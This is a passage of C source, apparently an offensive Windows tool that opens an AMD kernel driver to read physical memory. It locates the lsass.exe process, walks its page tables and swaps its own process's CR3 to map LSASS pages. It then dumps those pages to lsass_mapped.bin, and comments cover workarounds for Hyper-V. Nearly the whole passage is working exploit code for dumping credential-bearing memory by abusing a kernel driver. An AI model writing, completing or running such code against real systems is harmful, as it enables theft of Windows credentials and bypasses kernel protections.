    enable_debug_priv();

    /* Open driver */
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open AMD driver: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Driver opened\n");

    /* Physical ranges */
    load_ranges();
    if (!g_nranges) { printf("[-] No physical ranges\n"); return 1; }

    /* Kernel CR3 */
    printf("[*] Finding kernel CR3...\n");
    uint64_t nt_va = get_ntoskrnl_va();
    g_kernel_cr3 = find_kernel_cr3(nt_va);
    if (!g_kernel_cr3) { printf("[-] Kernel CR3 not found\n"); return 1; }
    printf("[+] Kernel CR3 = 0x%012"PRIX64"\n\n", g_kernel_cr3);

    /* Own EPROCESS */
    printf("[*] Finding own EPROCESS...\n");
    uint64_t own_eproc_pa = find_own_eproc_pa();
    if (!own_eproc_pa) { printf("[-] Own EPROCESS not found\n"); return 1; }
    printf("[+] Own EPROCESS PA = 0x%012"PRIX64"\n\n", own_eproc_pa);

    /* Decide target: LSASS or specific PA */
    uint64_t single_pa = 0;
    if (argc >= 2) {
        single_pa = (uint64_t)strtoull(argv[1], NULL, 16);
        printf("[*] Target: specific PA 0x%"PRIX64"\n\n", single_pa);
    }

    uint64_t target_pas[64];
    int n_target = 0;

    if (single_pa) {
        target_pas[0] = single_pa & ~0xFFFULL;
        n_target = 1;
    } else {
        /* Find LSASS */
        printf("[*] Finding LSASS EPROCESS...\n");
        uint32_t lsass_pid = 0;
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe = {sizeof pe};
            if (Process32First(snap, &pe)) do {
                if (_stricmp(pe.szExeFile, "lsass.exe") == 0)
                    { lsass_pid = pe.th32ProcessID; break; }
            } while (Process32Next(snap, &pe));
            CloseHandle(snap);
        }
        printf("[*] LSASS PID = %u\n", lsass_pid);

        /* Try fast list walk first; fall back to RAM scan on Hyper-V */
        uint64_t lsass_eproc_pa = find_proc_pa(own_eproc_pa, "lsass.exe", lsass_pid);
        if (!lsass_eproc_pa) {
            printf("  [!] List walk failed (kva_to_pa=0?) — RAM scan for lsass.exe...\n");
            lsass_eproc_pa = scan_eproc_physical(lsass_pid, "lsass.exe");
        }
        if (!lsass_eproc_pa) { printf("[-] LSASS EPROCESS not found\n"); return 1; }

        /* Read LSASS DTB */
        uint64_t lsass_cr3 = 0;
        phys_read(lsass_eproc_pa + OFF_DTB, &lsass_cr3, 8);
        printf("[+] LSASS DTB (CR3) = 0x%012"PRIX64"\n\n", lsass_cr3);
        if (!lsass_cr3) { printf("[-] LSASS DTB is 0\n"); return 1; }

        /* Get LSASS image base VA from Module snapshot */
        uint64_t lsass_base = 0;
        snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, lsass_pid);
        if (snap != INVALID_HANDLE_VALUE) {
            MODULEENTRY32 me = {sizeof me};
            if (Module32First(snap, &me))
                lsass_base = (uint64_t)(uintptr_t)me.modBaseAddr;
            CloseHandle(snap);
        }
        if (!lsass_base) {
            printf("[!] Module snapshot failed — using 0x7FF000000000 heuristic\n");
            lsass_base = 0x7FF000000000ULL;
        }
        printf("[*] LSASS image base VA = 0x%016"PRIX64"\n\n", lsass_base);

        /* Collect physical pages by walking LSASS page tables.
         * WHY cr3_walk fails on Hyper-V: SLAT protects LSASS's page-table pages
         * (PML4/PDPT/PD/PT physical pages) from direct guest reads. Each phys_read
         * of a PT entry returns 0 → cr3_walk returns 0 → no pages found.
         * On physical AMD hardware this succeeds. */
        printf("[*] Collecting LSASS physical pages via cr3_walk...\n");
        n_target = collect_proc_pages_at_va(lsass_cr3, lsass_base, target_pas, 16);
        if (!n_target) {
            printf("[-] No LSASS pages found via cr3_walk.\n");
            printf("    On Hyper-V: SLAT blocks reads of LSASS page-table pages.\n");
            printf("    On physical AMD Ryzen: this should work.\n");
            printf("    Workaround: use 'cr3_swap.exe <PA_hex>' with a known PA,\n");
            printf("    or run on physical machine.\n");
            return 1;
        }
        printf("[+] Collected %d physical pages\n\n", n_target);
    }

    /* Build page table chain */
    printf("[*] Building custom PML4 + PDPT + PD + PT...\n");
    Cr3Mapping m;
    if (!cr3_build_mapping(&m, own_eproc_pa, target_pas, n_target)) {
        printf("[-] Failed to build mapping\n"); return 1;
    }
    printf("[+] Mapping built. Slot %u → base VA 0x%016"PRIX64"\n\n",
           m.pml4_slot, m.map_va_base);

    /* Apply CR3 swap */
    printf("[*] Applying CR3 swap...\n");
    uint64_t orig_dtb = 0;
    if (!cr3_swap_apply(&m, own_eproc_pa, &orig_dtb)) {
        printf("[-] CR3 swap failed\n"); return 1;
    }

    /* Read from mapped VA */
    printf("[*] Attempting read from mapped VA 0x%016"PRIX64"...\n", m.map_va_base);
    uint8_t preview[64] = {0};
    int ok = try_read_mapped(m.map_va_base, preview, 64);

    if (ok) {
        printf("\n[+] CR3 SWAP SUCCESSFUL — reading physical memory via pointer!\n");
        printf("    First 64 bytes at VA 0x%016"PRIX64":\n    ", m.map_va_base);
        for (int i = 0; i < 64; i++) {
            printf("%02x ", preview[i]);
            if ((i & 15) == 15 && i < 63) printf("\n    ");
        }
        printf("\n");

        /* Check for MZ header (lsass.exe image) */
        if (preview[0] == 'M' && preview[1] == 'Z')
            printf("\n[+] MZ header confirmed — reading lsass.exe from physical memory!\n");

        /* Dump full mapping to file */
        if (!single_pa) {
            printf("\n[*] Dumping %d pages (%u KB) to lsass_mapped.bin...\n",
                   m.n_pages, m.n_pages * 4);
            FILE *f = fopen("lsass_mapped.bin", "wb");
            if (f) {
                /* Read each mapped page individually to handle gaps */
                for (uint32_t pg = 0; pg < m.n_pages; pg++) {
                    uint8_t page_buf[4096] = {0};
                    uint64_t pg_va = m.map_va_base + (uint64_t)pg * 0x1000;
                    if (try_read_mapped(pg_va, page_buf, 4096))
                        fwrite(page_buf, 1, 4096, f);
                    else {
                        printf("  [!] Page %u read failed — writing zeros\n", pg);
                        fwrite(page_buf, 1, 4096, f);
                    }
                }
                fclose(f);
                printf("[+] Saved to lsass_mapped.bin\n");
            }
        }
    } else {
        printf("[-] CR3 swap did not take effect (see above for diagnosis)\n");
    }

    /* Restore — MUST happen before cr3_mapping_free */
    printf("\n[*] Restoring original CR3...\n");
    cr3_swap_restore(own_eproc_pa, orig_dtb, &m);

    /* Free buffers AFTER restore */
    cr3_mapping_free(&m);

    printf("[+] Done.\n");
    return ok ? 0 : 1;
}
